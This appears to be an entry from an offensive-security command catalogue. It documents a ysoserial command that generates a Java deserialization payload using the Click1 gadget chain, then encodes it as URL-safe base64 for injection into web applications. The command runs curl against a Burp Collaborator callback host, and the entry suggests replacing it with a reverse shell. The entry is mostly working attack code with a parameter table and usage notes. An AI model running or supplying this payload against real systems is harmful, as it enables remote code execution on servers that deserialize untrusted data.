---
id: cmd-uuid-002
data: >-
  java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl
  https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \x00
  && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt
tags:
  - payload-generation
  - deserialization
type: command
output: null
executor: bash
platforms:
  - Linux
  - Java
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:31.123Z'
verified: false
validated: true
submitted: true
---
# java-ysoserial-generate-payload

## Command

```bash
java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt
```

## Description

This command generates a Java deserialization payload using ysoserial with the Click1 gadget to execute a curl command, processes it with a null byte prepend, base64 encoding, URL-safe conversion, and saves the result for injection in web exploits.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -jar | Specifies the ysoserial JAR file | Yes |
| Click1 | Gadget chain type for deserialization | Yes |
| "curl ..." | Command to execute upon deserialization | Yes |
| echo -ne \x00 | Prepends null byte to binary output | Yes |
| base64 | Encodes to base64 | Yes |
| tr '/+' '_-' | Converts to URL-safe base64 | Yes |
| tr -d '=' | Removes padding | Yes |
| tr -d '\n' | Removes newlines | Yes |
| > payload.txt | Saves output to file | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://example.com" | (echo -ne \x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt
```

### Advanced Usage

Replace the curl command with a custom payload, e.g., for reverse shell.

## Expected Output

A file payload.txt containing a single line of URL-safe base64-encoded string representing the serialized payload, without padding or newlines.

## Related

- [[Related Procedure|procedures/Generate-Deserialization-Payload-with-Ysoserial-for-RCE]]
